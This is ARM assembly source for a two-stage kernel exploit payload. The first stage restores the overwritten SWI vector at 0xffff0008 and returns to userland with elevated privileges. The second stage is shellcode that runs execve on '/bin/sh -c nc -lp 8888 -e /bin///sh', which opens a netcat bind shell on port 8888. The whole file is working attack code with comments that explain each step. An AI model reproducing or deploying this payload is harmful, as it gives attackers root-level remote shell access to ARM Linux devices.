/*
    stage_1 sets up the stack frame to return to user land
    by seting the return address to the address of stage_2
    and then restores the value of the SWI vector

    stage_2 is just does 
        execve("/bin/sh", ["/bin/sh", "-c", "nc -lp 8888 -e /bin///sh"], NULL)
*/

stage_1:
    adr     lr, stage_2
    push    {lr}
    stmfd   sp!, {r0-r12}
    ldr     r0, =0xe59ff410     @ intial value at 0xffff0008 which is
                                @ ldr     pc, [pc, #1040] ; 0xffff0420
    ldr     r1, =0xffff0008
    str     r0, [r1]
    ldmfd   sp!, {r0-r12, pc}^  @ return to userland

stage_2:
    ldr     r0, =0x6e69622f     @ /bin
    ldr     r1, =0x68732f2f     @ //sh
    eor     r2, r2, r2          @ 0x00000000
    push    {r0, r1, r2}
    mov     r0, sp

    ldr     r4, =0x0000632d     @ -c\x00\x00
    push    {r4}
    mov     r4, sp

    ldr     r5, =0x2d20636e
    ldr     r6, =0x3820706c
    ldr     r7, =0x20383838
    ldr     r8, =0x2f20652d
    ldr     r9, =0x2f6e6962
    ldr     r10, =0x68732f2f

    eor     r11, r11, r11
    push    {r5-r11}
    mov     r5, sp
    push    {r2}

    eor     r6, r6, r6
    push    {r0,r4,r5, r6}
    mov     r1, sp
    mov     r7, #11
    swi     0x0

    mov     r0, #99
    mov     r7, #1
    swi     0x0
